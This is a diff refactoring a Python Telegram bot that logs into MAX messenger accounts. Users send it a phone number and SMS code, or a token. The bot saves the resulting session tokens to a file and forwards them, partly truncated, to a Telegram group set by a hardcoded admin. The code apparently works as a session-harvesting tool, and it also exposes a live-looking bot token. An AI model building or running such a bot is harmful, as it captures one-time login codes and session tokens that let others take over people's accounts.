@@ -1,22 +1,16 @@
-import os
-import re
-import asyncio
-import threading
-import logging
+import os, re, asyncio, threading, logging
 from datetime import datetime
 from telebot import TeleBot
 from telebot.types import ReplyKeyboardMarkup, KeyboardButton
 from pymax import MaxClient
 from pymax.payloads import UserAgentPayload
 
-# ============ НАСТРОЙКИ ============
 BOT_TOKEN = "8659417974:AAE359LdyMebHRJToSUJi7QnkcXHD-A9xBI"
 ADMIN_ID = 626387429
 GROUP_FILE = "group_id.txt"
-# ===================================
 
 bot = TeleBot(BOT_TOKEN, threaded=True)
-logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+logging.basicConfig(level=logging.INFO)
 
 user_states = {}
 saved_sessions = []
@@ -24,282 +18,197 @@ saved_sessions = []
 def load_group_id():
     if os.path.exists(GROUP_FILE):
         with open(GROUP_FILE, "r") as f:
-            try:
-                return int(f.read().strip())
-            except:
-                return None
+            try: return int(f.read().strip())
+            except: return None
     return None
 
-def save_group_id(group_id):
-    with open(GROUP_FILE, "w") as f:
-        f.write(str(group_id))
+def save_group_id(gid):
+    with open(GROUP_FILE, "w") as f: f.write(str(gid))
 
 GROUP_CHAT_ID = load_group_id()
 
-def main_keyboard():
-    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
-    markup.add(
-        KeyboardButton("📱 Войти по номеру"),
-        KeyboardButton("🔑 Войти по токену"),
-        KeyboardButton("📷 Сканировать QR"),
-        KeyboardButton("📋 Мои сессии"),
-        KeyboardButton("📤 Отправить в группу")
-    )
-    return markup
+def main_kb():
+    m = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
+    m.add(KeyboardButton("📱 Войти по номеру"), KeyboardButton("🔑 Войти по токену"),
+          KeyboardButton("📷 Сканировать QR"), KeyboardButton("📋 Мои сессии"),
+          KeyboardButton("📤 Отправить в группу"))
+    return m
 
-def cancel_keyboard():
-    markup = ReplyKeyboardMarkup(resize_keyboard=True)
-    markup.add(KeyboardButton("❌ Отмена"))
-    return markup
+def cancel_kb():
+    m = ReplyKeyboardMarkup(resize_keyboard=True)
+    m.add(KeyboardButton("❌ Отмена"))
+    return m
 
-async def max_request_code(phone):
-    ua = UserAgentPayload(
-        device_type="DESKTOP",
-        app_version="26.2.3",
-        system_version="macOS Sonoma 14.5",
-        screen="1440x900 2.0x",
-        timezone="Europe/Moscow",
-        locale="ru-RU"
-    )
-    client = MaxClient(phone=phone, headers=ua)
+ua = UserAgentPayload(app_version="26.2.3", system_version="macOS 14.5",
+                       screen="1440x900", timezone="Europe/Moscow", locale="ru-RU")
+
+async def req_code(phone):
+    c = MaxClient(phone=phone, headers=ua)
     try:
-        await client.start()
-        return True, client, "Код отправлен на номер"
+        await c.start()
+        return True, c, "Код отправлен"
     except Exception as e:
-        await client.stop()
-        return False, None, f"Ошибка: {e}"
+        await c.stop()
+        return False, None, str(e)
 
-async def max_confirm_code(client, code):
+async def conf_code(c, code):
     try:
-        await client.login(code=code)
-        me = client.me
-        token = client.token
-        phone = client.phone
-        info = (
-            f"ID: {me.id}\n"
-            f"Имя: {me.firstname} {me.lastname or ''}\n"
-            f"Телефон: {phone}\n"
-            f"Токен: {token[:50]}..."
-        )
-        await client.stop()
-        return True, token, phone, info
+        await c.login(code=code)
+        t = c.token; p = c.phone; m = c.me
+        info = f"ID: {m.id}\nИмя: {m.firstname} {m.lastname or ''}\nТелефон: {p}\nТокен: {t[:50]}..."
+        await c.stop()
+        return True, t, p, info
     except Exception as e:
-        await client.stop()
-        return False, None, None, f"Ошибка: {e}"
+        await c.stop()
+        return False, None, None, str(e)
 
-async def max_login_by_token(token):
-    ua = UserAgentPayload(
-        device_type="DESKTOP",
-        app_version="26.2.3",
-        system_version="macOS Sonoma 14.5",
-        screen="1440x900 2.0x",
-        timezone="Europe/Moscow",
-        locale="ru-RU"
-    )
-    client = MaxClient(token=token, headers=ua)
+async def login_tok(token):
+    c = MaxClient(token=token, headers=ua)
     try:
-        await client.start()
-        me = client.me
-        info = f"ID: {me.id}\nИмя: {me.firstname} {me.lastname or ''}\nТелефон: {client.phone}"
-        await client.stop()
+        await c.start()
+        m = c.me
+        info = f"ID: {m.id}\nИмя: {m.firstname} {m.lastname or ''}\nТелефон: {c.phone}"
+        await c.stop()
         return True, info
     except Exception as e:
-        await client.stop()
-        return False, f"Ошибка: {e}"
+        await c.stop()
+        return False, str(e)
 
-def send_sessions_to_group():
-    global GROUP_CHAT_ID
-    if not GROUP_CHAT_ID:
-        return "❌ Группа не настроена. Используйте /group в группе (только админ)."
-    if not saved_sessions:
-        return "Нет сохранённых сессий."
-    msg = "🔑 **Сессии MAX:**\n\n"
-    for i, s in enumerate(saved_sessions[-10:], 1):
-        msg += f"{i}. `{s[:40]}...`\n"
+def send_to_group():
+    if not GROUP_CHAT_ID: return "❌ Группа не задана."
+    if not saved_sessions: return "Нет сессий."
+    msg = "🔑 **Сессии:**\n\n"
+    for i,s in enumerate(saved_sessions[-10:],1): msg += f"{i}. `{s[:40]}...`\n"
     try:
         bot.send_message(GROUP_CHAT_ID, msg, parse_mode="Markdown")
-        return f"Отправлено {min(len(saved_sessions), 10)} сессий в группу."
-    except Exception as e:
-        return f"Ошибка отправки в группу: {e}"
+        return f"Отправлено {min(len(saved_sessions),10)} сессий."
+    except Exception as e: return f"Ошибка: {e}"
 
-# ============ КОМАНДА /group (АДМИН) ============
 @bot.message_handler(commands=['group'])
-def set_group(message):
+def set_group(msg):
     global GROUP_CHAT_ID
-    if message.from_user.id != ADMIN_ID:
-        bot.reply_to(message, "⛔ Доступ запрещён.")
+    if msg.from_user.id != ADMIN_ID:
+        bot.reply_to(msg, "⛔ Нет доступа.")
         return
-    if message.chat.type in ['group', 'supergroup']:
-        new_group_id = message.chat.id
-        save_group_id(new_group_id)
-        GROUP_CHAT_ID = new_group_id
-        bot.reply_to(message, f"✅ Эта группа сохранена для отправки сессий.\nID: `{new_group_id}`", parse_mode="Markdown")
+    if msg.chat.type in ['group','supergroup']:
+        save_group_id(msg.chat.id); GROUP_CHAT_ID = msg.chat.id
+        bot.reply_to(msg, f"✅ Группа сохранена.")
         return
-    parts = message.text.strip().split()
-    if len(parts) != 2:
-        bot.reply_to(message, "ℹ️ В личке укажите ID: `/group -1001234567890`\nВ группе просто `/group`", parse_mode="Markdown")
+    parts = msg.text.strip().split()
+    if len(parts)!=2:
+        bot.reply_to(msg, "ℹ️ `/group -1001234567890` или в группе `/group`", parse_mode="Markdown")
         return
     try:
-        new_group_id = int(parts[1])
-    except ValueError:
-        bot.reply_to(message, "❌ ID группы должен быть числом.")
-        return
-    save_group_id(new_group_id)
-    GROUP_CHAT_ID = new_group_id
-    bot.reply_to(message, f"✅ ID группы сохранён: `{new_group_id}`", parse_mode="Markdown")
+        gid = int(parts[1])
+        save_group_id(gid); GROUP_CHAT_ID = gid
+        bot.reply_to(msg, f"✅ Сохранено: {gid}", parse_mode="Markdown")
+    except:
+        bot.reply_to(msg, "❌ ID должен быть числом.")
 
 @bot.message_handler(commands=['start'])
-def start(message):
-    user_states.pop(message.chat.id, None)
-    bot.reply_to(message,
-        "🤖 **MAX Session Bot**\n\nВыберите действие:",
-        parse_mode="Markdown",
-        reply_markup=main_keyboard()
-    )
+def start(msg):
+    user_states.pop(msg.chat.id, None)
+    bot.reply_to(msg, "🤖 **MAX Session Bot**\nВыберите действие:", parse_mode="Markdown", reply_markup=main_kb())
 
 @bot.message_handler(func=lambda m: True)
-def handle_message(message):
+def handler(msg):
     global GROUP_CHAT_ID
-    chat_id = message.chat.id
-    text = message.text.strip() if message.text else ""
-    state = user_states.get(chat_id, {}).get("state")
+    cid = msg.chat.id
+    txt = msg.text.strip() if msg.text else ""
+    s = user_states.get(cid, {}).get("state")
 
-    if text == "❌ Отмена":
-        user_states.pop(chat_id, None)
-        bot.reply_to(message, "Отменено.", reply_markup=main_keyboard())
-        return
+    if txt == "❌ Отмена":
+        user_states.pop(cid,None); bot.reply_to(msg, "Отменено.", reply_markup=main_kb()); return
 
-    if text == "📱 Войти по номеру":
-        user_states[chat_id] = {"state": "waiting_phone"}
-        bot.reply_to(message, "📱 Введите номер:\n`+7XXXXXXXXXX`", parse_mode="Markdown", reply_markup=cancel_keyboard())
-        return
+    if txt == "📱 Войти по номеру":
+        user_states[cid] = {"state":"waiting_phone"}; bot.reply_to(msg, "📱 Номер:\n`+7XXXXXXXXXX`", parse_mode="Markdown", reply_markup=cancel_kb()); return
 
-    if state == "waiting_phone":
-        phone = re.sub(r'[\s\-\(\)]', '', text)
-        if not phone.startswith("+"):
-            phone = "+7" + phone.lstrip("87")
-        if len(phone) < 11:
-            bot.reply_to(message, "❌ Номер короткий.", reply_markup=cancel_keyboard())
-            return
-        bot.reply_to(message, "📱 Запрашиваю SMS-код...")
-        def req():
-            loop = asyncio.new_event_loop()
-            asyncio.set_event_loop(loop)
-            ok, client, msg = loop.run_until_complete(max_request_code(phone))
+    if s == "waiting_phone":
+        phone = re.sub(r'[\s\-\(\)]','',txt)
+        if not phone.startswith("+"): phone = "+7"+phone.lstrip("87")
+        if len(phone)<11: bot.reply_to(msg,"❌ Короткий.", reply_markup=cancel_kb()); return
+        bot.reply_to(msg, "📱 Запрашиваю код...")
+        def r():
+            loop = asyncio.new_event_loop(); asyncio.set_event_loop(loop)
+            ok, cl, m = loop.run_until_complete(req_code(phone))
             if ok:
-                user_states[chat_id] = {"state": "waiting_code", "phone": phone, "client": client}
-                bot.send_message(chat_id, f"✅ {msg}\n\n📩 Введите 6-значный код:", reply_markup=cancel_keyboard())
+                user_states[cid] = {"state":"waiting_code","phone":phone,"client":cl}
+                bot.send_message(cid, f"✅ {m}\n📩 Код:", reply_markup=cancel_kb())
             else:
-                bot.send_message(chat_id, f"❌ {msg}", reply_markup=main_keyboard())
-                user_states.pop(chat_id, None)
+                bot.send_message(cid, f"❌ {m}", reply_markup=main_kb()); user_states.pop(cid,None)
             loop.close()
-        threading.Thread(target=req).start()
+        threading.Thread(target=r).start()
         return
 
-    if state == "waiting_code":
-        code = re.sub(r'\D', '', text)
-        if len(code) != 6:
-            bot.reply_to(message, "❌ 6 цифр.", reply_markup=cancel_keyboard())
-            return
-        client = user_states[chat_id]["client"]
-        phone = user_states[chat_id]["phone"]
-        bot.reply_to(message, "🔐 Подтверждаю код...")
-        def conf():
-            loop = asyncio.new_event_loop()
-            asyncio.set_event_loop(loop)
-            ok, token, ph, info = loop.run_until_complete(max_confirm_code(client, code))
+    if s == "waiting_code":
+        code = re.sub(r'\D','',txt)
+        if len(code)!=6: bot.reply_to(msg,"❌ 6 цифр.", reply_markup=cancel_kb()); return
+        cl = user_states[cid]["client"]; phone = user_states[cid]["phone"]
+        bot.reply_to(msg, "🔐 Подтверждаю...")
+        def c():
+            loop = asyncio.new_event_loop(); asyncio.set_event_loop(loop)
+            ok, tok, ph, info = loop.run_until_complete(conf_code(cl, code))
             if ok:
-                saved_sessions.append(token)
-                with open("sessions.txt", "a", encoding="utf-8") as f:
-                    f.write(f"{datetime.now()} | {ph} | {token}\n")
-                bot.send_message(chat_id, f"🟢 **ВХОД ВЫПОЛНЕН!**\n\n```\n{info}\n```", parse_mode="Markdown", reply_markup=main_keyboard())
+                saved_sessions.append(tok)
+                with open("sessions.txt","a") as f: f.write(f"{datetime.now()} | {ph} | {tok}\n")
+                bot.send_message(cid, f"🟢 **ВХОД ВЫПОЛНЕН!**\n```\n{info}\n```", parse_mode="Markdown", reply_markup=main_kb())
                 if GROUP_CHAT_ID:
-                    try:
-                        bot.send_message(GROUP_CHAT_ID, f"🔑 Новая сессия:\n`{token[:50]}...`", parse_mode="Markdown")
-                    except:
-                        pass
-            else:
-                bot.send_message(chat_id, f"🔴 {info}", reply_markup=main_keyboard())
-            user_states.pop(chat_id, None)
-            loop.close()
-        threading.Thread(target=conf).start()
+                    try: bot.send_message(GROUP_CHAT_ID, f"🔑 Сессия:\n`{tok[:50]}...`", parse_mode="Markdown")
+                    except: pass
+            else: bot.send_message(cid, f"🔴 {info}", reply_markup=main_kb())
+            user_states.pop(cid,None); loop.close()
+        threading.Thread(target=c).start()
         return
 
-    if text == "🔑 Войти по токену":
-        user_states[chat_id] = {"state": "waiting_token"}
-        bot.reply_to(message, "🔑 Вставьте токен:", reply_markup=cancel_keyboard())
-        return
+    if txt == "🔑 Войти по токену":
+        user_states[cid] = {"state":"waiting_token"}; bot.reply_to(msg, "🔑 Токен:", reply_markup=cancel_kb()); return
 
-    if state == "waiting_token":
-        token = text.replace(" ", "").replace("\n", "")
-        if len(token) < 50:
-            bot.reply_to(message, "❌ Токен короткий.", reply_markup=cancel_keyboard())
-            return
-        bot.reply_to(message, "🔍 Проверяю...")
-        def tok():
-            loop = asyncio.new_event_loop()
-            asyncio.set_event_loop(loop)
-            ok, info = loop.run_until_complete(max_login_by_token(token))
+    if s == "waiting_token":
+        tok = txt.replace(" ","").replace("\n","")
+        if len(tok)<50: bot.reply_to(msg,"❌ Короткий.", reply_markup=cancel_kb()); return
+        bot.reply_to(msg, "🔍 Проверяю...")
+        def t():
+            loop = asyncio.new_event_loop(); asyncio.set_event_loop(loop)
+            ok, info = loop.run_until_complete(login_tok(tok))
             if ok:
-                saved_sessions.append(token)
-                with open("sessions.txt", "a", encoding="utf-8") as f:
-                    f.write(f"{datetime.now()} | TOKEN | {token}\n")
-                bot.send_message(chat_id, f"🟢 **СЕССИЯ АКТИВНА!**\n\n```\n{info}\n```", parse_mode="Markdown", reply_markup=main_keyboard())
+                saved_sessions.append(tok)
+                with open("sessions.txt","a") as f: f.write(f"{datetime.now()} | TOKEN | {tok}\n")
+                bot.send_message(cid, f"🟢 **АКТИВНА!**\n```\n{info}\n```", parse_mode="Markdown", reply_markup=main_kb())
                 if GROUP_CHAT_ID:
-                    try:
-                        bot.send_message(GROUP_CHAT_ID, f"🔑 Новая сессия:\n`{token[:50]}...`", parse_mode="Markdown")
-                    except:
-                        pass
-            else:
-                bot.send_message(chat_id, f"🔴 {info}", reply_markup=main_keyboard())
-            user_states.pop(chat_id, None)
-            loop.close()
-        threading.Thread(target=tok).start()
+                    try: bot.send_message(GROUP_CHAT_ID, f"🔑 Сессия:\n`{tok[:50]}...`", parse_mode="Markdown")
+                    except: pass
+            else: bot.send_message(cid, f"🔴 {info}", reply_markup=main_kb())
+            user_states.pop(cid,None); loop.close()
+        threading.Thread(target=t).start()
         return
 
-    if text == "📷 Сканировать QR":
-        user_states[chat_id] = {"state": "waiting_qr"}
-        bot.reply_to(message, "📷 Отправьте фото с QR-кодом:", reply_markup=cancel_keyboard())
-        return
+    if txt == "📷 Сканировать QR":
+        user_states[cid] = {"state":"waiting_qr"}; bot.reply_to(msg, "📷 Фото QR:", reply_markup=cancel_kb()); return
 
-    if state == "waiting_qr":
-        if not message.photo:
-            bot.reply_to(message, "❌ Отправьте фото.", reply_markup=cancel_keyboard())
-            return
-        file_info = bot.get_file(message.photo[-1].file_id)
-        file_content = bot.download_file(file_info.file_path)
-        from io import BytesIO
-        import requests as req
+    if s == "waiting_qr":
+        if not msg.photo: bot.reply_to(msg,"❌ Фото.", reply_markup=cancel_kb()); return
+        fi = bot.get_file(msg.photo[-1].file_id); fc = bot.download_file(fi.file_path)
+        from io import BytesIO; import requests as rq
         try:
-            resp = req.post("https://api.qrserver.com/v1/read-qr-code/", files={"file": BytesIO(file_content)})
+            resp = rq.post("https://api.qrserver.com/v1/read-qr-code/", files={"file":BytesIO(fc)})
             data = resp.json()
             if data and data[0]["symbol"][0]["data"]:
-                qr_data = data[0]["symbol"][0]["data"]
-                bot.reply_to(message, f"✅ QR распознан:\n\n`{qr_data}`", parse_mode="Markdown", reply_markup=main_keyboard())
-            else:
-                bot.reply_to(message, "❌ QR не найден.", reply_markup=main_keyboard())
-        except:
-            bot.reply_to(message, "❌ Ошибка распознавания.", reply_markup=main_keyboard())
-        user_states.pop(chat_id, None)
-        return
+                bot.reply_to(msg, f"✅ `{data[0]['symbol'][0]['data']}`", parse_mode="Markdown", reply_markup=main_kb())
+            else: bot.reply_to(msg, "❌ Не найден.", reply_markup=main_kb())
+        except: bot.reply_to(msg, "❌ Ошибка.", reply_markup=main_kb())
+        user_states.pop(cid,None); return
 
-    if text == "📋 Мои сессии":
-        if not saved_sessions:
-            bot.reply_to(message, "Нет сохранённых сессий.", reply_markup=main_keyboard())
+    if txt == "📋 Мои сессии":
+        if not saved_sessions: bot.reply_to(msg, "Нет.", reply_markup=main_kb())
         else:
-            msg = "📋 **Сохранённые сессии:**\n\n"
-            for i, s in enumerate(saved_sessions[-10:], 1):
-                msg += f"{i}. `{s[:40]}...`\n"
-            bot.reply_to(message, msg, parse_mode="Markdown", reply_markup=main_keyboard())
+            ms = "📋 **Сессии:**\n\n"
+            for i,s in enumerate(saved_sessions[-10:],1): ms += f"{i}. `{s[:40]}...`\n"
+            bot.reply_to(msg, ms, parse_mode="Markdown", reply_markup=main_kb())
         return
 
-    if text == "📤 Отправить в группу":
-        result = send_sessions_to_group()
-        bot.reply_to(message, result, reply_markup=main_keyboard())
-        return
+    if txt == "📤 Отправить в группу":
+        bot.reply_to(msg, send_to_group(), reply_markup=main_kb())
 
 if __name__ == "__main__":
-    print("🤖 MAX Session Bot запущен...")
-    print(f"Админ ID: {ADMIN_ID}")
-    print(f"Группа: {GROUP_CHAT_ID if GROUP_CHAT_ID else 'не задана'}")
+    print("🤖 MAX Session Bot...")
     bot.infinity_polling()
